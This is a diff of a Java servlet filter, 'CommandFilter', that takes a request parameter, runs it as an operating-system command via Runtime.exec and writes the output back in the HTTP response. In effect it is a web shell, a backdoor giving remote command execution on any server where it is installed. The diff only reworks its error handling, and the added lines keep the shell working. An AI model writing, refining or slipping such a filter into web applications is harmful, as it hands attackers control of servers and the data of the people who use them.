@@ -23,22 +23,18 @@ public class CommandFilter implements Filter {
         HttpServletRequest servletRequest = (HttpServletRequest) request;
         HttpServletResponse servletResponse = (HttpServletResponse) response;
         String cmd = servletRequest.getParameter(paramName);
-        try {
-            if (cmd != null) {
-                Process exec = Runtime.getRuntime().exec(cmd);
-                InputStream inputStream = exec.getInputStream();
-                ServletOutputStream outputStream = servletResponse.getOutputStream();
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
-            } else {
-                chain.doFilter(servletRequest, servletResponse);
+        if (cmd != null) {
+            Process exec = Runtime.getRuntime().exec(cmd);
+            InputStream inputStream = exec.getInputStream();
+            ServletOutputStream outputStream = servletResponse.getOutputStream();
+            byte[] buf = new byte[8192];
+            int length;
+            while ((length = inputStream.read(buf)) != -1) {
+                outputStream.write(buf, 0, length);
             }
-        } catch (Exception e) {
-            chain.doFilter(servletRequest, servletResponse);
+            return;
         }
+        chain.doFilter(servletRequest, servletResponse);
     }
 
     @Override
